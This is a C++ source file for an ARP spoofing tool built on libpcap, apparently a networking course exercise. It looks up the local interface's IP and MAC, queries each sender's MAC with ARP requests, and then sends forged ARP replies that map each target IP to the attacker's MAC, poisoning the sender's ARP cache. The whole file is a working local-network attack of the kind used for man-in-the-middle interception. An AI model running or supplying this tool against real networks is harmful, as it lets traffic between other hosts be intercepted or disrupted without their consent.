#include <cstdio>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <string.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

Ip get_my_ip(const char* dev) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);

    struct sockaddr_in* addr = (struct sockaddr_in*)&ifr.ifr_addr;
    char ip_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &addr->sin_addr, ip_str, sizeof(ip_str));

    return Ip(ip_str);
}

Mac get_my_mac(const char* dev) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);

    strcpy(ifr.ifr_name, dev);
    ioctl(fd, SIOCGIFHWADDR, &ifr);

    close(fd);
    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

Mac get_sender_mac(pcap_t* pcap, Mac my_mac, Ip my_ip, Ip sender_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(my_ip);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        return Mac("00:00:00:00:00:00");
    }

    struct pcap_pkthdr* header;
    const u_char* packet_data;
    while (true) {
        int res = pcap_next_ex(pcap, &header, &packet_data);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        EthArpPacket* reply_packet = (EthArpPacket*)packet_data;
        if (ntohs(reply_packet->eth_.type_) != EthHdr::Arp) continue;
        if (ntohs(reply_packet->arp_.op_) != ArpHdr::Reply) continue;
        if (reply_packet->arp_.sip_ != htonl(sender_ip)) continue;

        return reply_packet->arp_.smac_;
    }
    return Mac("00:00:00:00:00:00");
}

void send_arp_spoof(pcap_t* pcap, Mac attacker_mac, Mac sender_mac, Ip sender_ip, Ip target_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = sender_mac;
    packet.eth_.smac_ = attacker_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = attacker_mac;
    packet.arp_.sip_ = htonl(target_ip);
    packet.arp_.tmac_ = sender_mac;
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
		usage();
        return EXIT_FAILURE;
    }

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

    Ip attacker_ip = get_my_ip(dev);
    Mac attacker_mac = get_my_mac(dev);
    printf("Attacker IP Address :%s\n", std::string(attacker_ip).c_str());
    printf("Attacker MAC Address : %s\n", std::string(attacker_mac).c_str());

    for (int i = 2; i < argc; i += 2) {
        Ip sender_ip = Ip(argv[i]);
        Ip target_ip = Ip(argv[i + 1]);

        Mac sender_mac = get_sender_mac(pcap, attacker_mac, attacker_ip, sender_ip);
        if (sender_mac == Mac("00:00:00:00:00:00")) {
            fprintf(stderr, "Couldn't get sender MAC address\n");
            continue;
        }
        printf("Sender IP Address :%s\n", std::string(sender_ip).c_str());
        printf("Sender MAC Address : %s\n", std::string(sender_mac).c_str());

        send_arp_spoof(pcap, attacker_mac, sender_mac, sender_ip, target_ip);
    }

	pcap_close(pcap);
}
